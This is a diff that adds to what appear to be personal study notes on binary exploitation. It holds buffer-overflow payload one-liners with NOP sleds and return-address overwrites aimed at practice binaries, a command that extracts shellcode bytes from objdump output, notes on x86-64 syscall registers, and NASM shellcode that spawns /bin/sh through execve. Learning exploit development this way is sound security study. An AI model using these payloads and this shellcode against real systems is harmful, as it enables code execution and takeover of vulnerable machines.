@@ -110,4 +110,60 @@ run $(python -c "print('\x90'*208   + '\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\
 
 ./integer_overflow -500000000000 $(python3 -c 'print("A"*50000+ "B"*4)')
 
+./integer_overflow 65536 $(python3 -c 'print("A"*106+ "B"*4)')
+
+
+```
+
+
+## shellcod extracter
+```bash
+objdump -d exit2.o | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'
+```
+
+Invoking system call with syscall
+> The syscall instruction transfers control to the operating system which then performs the requested service
+
+r-64
+e-32bit
+
+```nasm
+rax   ; system call number ; return code
+rdi ;1st argumernt
+rsi ; 2n argument
+rdx 3rd argument
+r10 4th
+r8 5th
+r9 6th
+```
+
+```nasm
+
+global _start
+
+SECTION .text
+
+_start:
+
+  xor rdx,rdx ; clear env
+  xor rsi,rsi ; clear  args ; also remove null bytes
+  xor rax,rax
+  mov rax, 0x68732f6e69622f ; "/bin/sh" = 2f62696e2f7368  - hex value i
+  push rax
+  ;push   0x68
+  ;push   0x7361622f
+  ;push   0x6e69622f
+  mov rdi,rsp
+; rax should contain syscall number - found in manual; also return val 
+  mov rax, 0x3b ;syscall execve number - 59  sys_execve (59)
+  syscall
+
+; Quit
+ 
+  mov  rbx,0       ; return code
+   mov al,1
+  
+  ;mov  rax,1       ; exit syscall number
+  int  0x80        ; syscall
+
 ```
